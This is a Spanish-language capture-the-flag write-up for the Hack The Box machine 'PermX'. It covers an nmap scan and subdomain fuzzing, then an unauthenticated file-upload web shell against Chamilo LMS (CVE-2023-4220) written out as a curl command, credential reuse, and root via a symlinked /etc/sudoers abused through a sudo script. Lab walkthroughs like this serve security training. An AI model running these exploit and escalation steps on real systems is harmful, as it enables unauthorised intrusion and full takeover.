#Easy #fuzzing #role #tecnicas 

### Ping

```python
ping -c 1 10.10.11.23
PING 10.10.11.23 (10.10.11.23) 56(84) bytes of data.
64 bytes from 10.10.11.23: icmp_seq=1 ttl=63 time=156 ms

--- 10.10.11.23 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 155.524/155.524/155.524/0.000 ms
```

### TTL = 63 Linux

### nmap

```python
# Nmap 7.94SVN scan initiated Fri Jul 12 13:52:19 2024 as: nmap -p- -open -sCV --min-rate 5000 -n -Pn -oN Scan 10.10.11.23
Nmap scan report for 10.10.11.23
Host is up (0.16s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://permx.htb
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul 12 13:52:48 2024 -- 1 IP address (1 host up) scanned in 28.04 seconds
```

### Enumeración del puerto 80 (http)
no parece haber mucho en la web asi que vamos a seguir enumerando
![[Pasted image 20240712135330.png]]

### Fuzzing con ffuf
encontramos un subdominio `lms` que me llama la atención
![[Pasted image 20240712135420.png]]

`Chamilo lms`
hemos conseguido un LMS llamado chamilo así que intentaremos buscar alguna vulnerabilidad 
![[Pasted image 20240712140800.png]]

### Vulnerabilidades

| CVE-XXXX-XXXXX | Nombre de la vulnerabilidad     | Tipo | Nivel | Link                                                                               |
| -------------- | ------------------------------- | ---- | ----- | ---------------------------------------------------------------------------------- |
| CVE-2023-4220  | Unauthenticated Big Upload File | RCE  | 8.1   | [RCE](https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc.git) |
|                |                                 |      |       |                                                                                    |
|                |                                 |      |       |                                                                                    |

```python

curl -F 'bigUploadFile=@shell.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'

```

de esta forma vamos a cargar un archivo malicioso en este caso llamado shell.php usando el parámetro `curl -F`
![[Pasted image 20240712140505.png]]

### Shell
estaremos a la escucha en el puerto que hemos especificado y navegamos hasta la ruta donde se ha subido el archivo
`http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/shell.php`
![[Pasted image 20240712141735.png]]

### User Pivoting
actualmente somos el usuario `www-data` y enumerando el sistema podemos conseguir un archivo que contiene credenciales
![[Pasted image 20240712151512.png]]

`chamilo`
usando las credenciales que hemos conseguido no hemos podido establecer conexión vía ssh ya que el usuario o la contraseña son incorrecta
![[Pasted image 20240712152044.png]]

`mtz`
enumerando el sistema podemos encontrar otro usuario y establecer la conexión vía ssh
![[Pasted image 20240712152253.png]]

### Escalada de privilegios
tenemos permisos de super usuario para el script `/opt/acl.sh` este archivo puede ser vulnerable ya que esta haciendo un llamado a `/etc/sudoers`
![[Pasted image 20240712161909.png]]

### Explotación del script /opt/acl.sh

```python
mtz@permx:~$ > ln -s /etc/sudoers /home/mtz/sudoers

mtz@permx:~$ > sudo /opt/acl.sh mtz rwx /home/mtz/sudoers

mtz@permx:~$ > nano sudoers 

Nota: aqui abrimos el enlace simbolico que hemos creado y al final de todo agregamos la linea:
mtz    ALL=(ALL:ALL) ALL

mtz@permx:~$ > sudo su

y finalmente ponemos la contraseña del usuario mtz para tener una shell como root
```

![[Pasted image 20240712162102.png]]

### WE ARE ROOT
